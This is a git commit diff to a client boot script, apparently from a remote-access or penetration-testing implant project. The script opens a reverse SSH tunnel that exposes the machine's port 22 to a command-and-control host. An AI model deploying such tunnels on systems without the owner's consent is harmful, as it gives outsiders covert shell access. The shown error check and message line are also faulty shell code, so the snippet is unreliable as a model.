44bb1d0d2cb460ea3b0d4fc72c5031c36a3e327b
sainate <nathan@piratica.us>
2019-05-22 19:52:40 -0400

    Added client/onboot.sh and took some of the functionality out of client/provision.sh and put it into client/onboot.sh

--- client/onboot.sh
+++ client/onboot.sh
@@ -12,7 +12,7 @@ source config.sh
 
 # Setup our SSH Tunnel
 $SUDO -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f
-if [ -z $? = 1 ]; then
+if [ -z $? == 1 ]; then
 		MSG .= "Failed to establish SSH  Tunnel"
 	fi
 
